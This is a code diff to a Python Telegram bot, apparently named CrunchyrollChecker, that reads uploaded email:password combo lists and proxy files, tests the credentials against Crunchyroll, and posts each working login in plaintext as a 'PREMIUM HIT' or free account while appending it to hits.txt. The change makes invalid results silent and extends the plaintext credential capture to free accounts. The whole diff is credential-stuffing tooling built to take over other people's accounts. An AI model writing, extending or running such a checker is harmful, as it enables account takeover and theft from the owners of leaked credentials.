@@ -168,8 +168,10 @@ class CrunchyrollChecker:
 
 
 async def send_result(chat_id, result):
-    if result['status'] == 'PREMIUM':
-        capture = f"""
+    if result['status'] == 'INVALID':
+        return  # ← Only change: completely silent for invalid
+
+    capture = f"""
 {'='*70}
 EMAIL: {result['email']}
 PASSWORD: {result['password']}
@@ -187,13 +189,14 @@ COUNTRY: {result.get('country', 'N/A')}
 CHECKED BY: @Sudhakaran12
 {'='*70}
 """
+
+    if result['status'] == 'PREMIUM':
         await bot.send_message(chat_id, f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
-        with open("hits.txt", "a", encoding="utf-8") as f:
-            f.write(capture + "\n")
-    elif result['status'] == 'FREE':
-        await bot.send_message(chat_id, f"🆓 FREE → {result['email']}")
-    else:
-        await bot.send_message(chat_id, f"❌ INVALID → {result['email']}")
+    else:  # FREE
+        await bot.send_message(chat_id, f"<b>🆓 FREE ACCOUNT</b>\n<pre>{capture}</pre>", parse_mode="HTML")
+
+    with open("hits.txt", "a", encoding="utf-8") as f:
+        f.write(capture + "\n")
 
 
 @dp.message(Command("start"))
@@ -215,7 +218,6 @@ async def proxies_cmd(message: types.Message):
 async def handle(message: types.Message):
     global checker
 
-    # Proxy loading
     if message.text and message.text.startswith("/proxies"):
         if message.document:
             file = await bot.get_file(message.document.file_id)
@@ -228,14 +230,12 @@ async def handle(message: types.Message):
         checker.proxies = proxies
         return await message.answer(f"✅ Loaded {len(proxies)} proxies!")
 
-    # Combo checking
     if message.document:
         file = await bot.get_file(message.document.file_id)
         content = (await bot.download_file(file.file_path)).read().decode('utf-8', errors='ignore')
     else:
         content = message.text
 
-    # STRICT CLEANING - ONLY email:password
     lines = []
     for raw in content.splitlines():
         raw = raw.strip()
@@ -251,7 +251,6 @@ async def handle(message: types.Message):
     if not lines:
         return await message.answer("No valid email:password found.")
 
-    # ←←← ONLY THIS LINE WAS ADDED (fixes second file issue)
     checker = CrunchyrollChecker(proxies)
 
     await message.answer(f"🚀 Checking {len(lines)} combos...")
